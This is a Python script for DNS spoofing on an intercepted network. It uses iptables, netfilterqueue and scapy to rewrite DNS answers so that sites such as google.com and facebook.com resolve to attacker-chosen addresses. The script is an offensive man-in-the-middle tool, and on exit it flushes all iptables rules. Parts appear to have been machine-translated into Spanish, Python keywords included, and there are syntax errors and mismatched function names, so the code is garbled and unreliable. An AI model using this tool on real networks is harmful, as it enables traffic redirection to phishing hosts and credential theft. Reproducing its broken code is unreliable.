
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# Registros de asignación de DNS, siéntase libre de agregar/modificar este diccionario
# por ejemplo, google.com será redirigido a 192.168.1.100
dns_hosts  = {
    b"www.google.com". : "https://m.facebook.com" ,
    b"google.com". : "192.168.1.100" ,
    b"facebook.com". : "172.217.19.142"
}


def  proceso_paquete ( paquete ):
    """
    Cada vez que se redirige un nuevo paquete a la cola de netfilter,
    esta devolución de llamada se llama.
    """
    # convertir el paquete de cola de netfilter en un paquete de scapy
    scapy_packet  =  IP ( paquete . get_payload ())
    si  scapy_packet . haslayer ( DNSRR ):
        # si el paquete es un registro de recursos DNS (respuesta DNS)
        # modificar el paquete
        imprimir ( "[Antes]:" , scapy_packet . resumen ())
        prueba :
            scapy_packet  =  modificar_paquete ( scapy_packet )
        excepto  IndexError :
            # no es un paquete UDP, pueden ser paquetes IPerror/UDPerror
            aprobar
        imprimir ( "[Después]:" , scapy_packet . resumen ())
        # restablecer como paquete de cola de netfilter
        paquete _ set_payload ( bytes ( scapy_packet ))
    # aceptar el paquete
    paquete _ aceptar ()


def  modificar_paquete ( paquete ):
    """
    Modifica el "paquete" del registro de recursos DNS (la parte de la respuesta)
    para mapear nuestro diccionario `dns_hosts` definido globalmente.
    Por ejemplo, cada vez que vemos una respuesta de google.com, esta función reemplaza
    la dirección IP real (172.217.19.142) con dirección IP falsa (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    excepto  KeyboardInterrupt :
        # si desea salir, asegúrese de que
        # eliminar esa regla que acabamos de insertar, volviendo a la normalidad.
        os _ sistema ( "iptables --flush" )
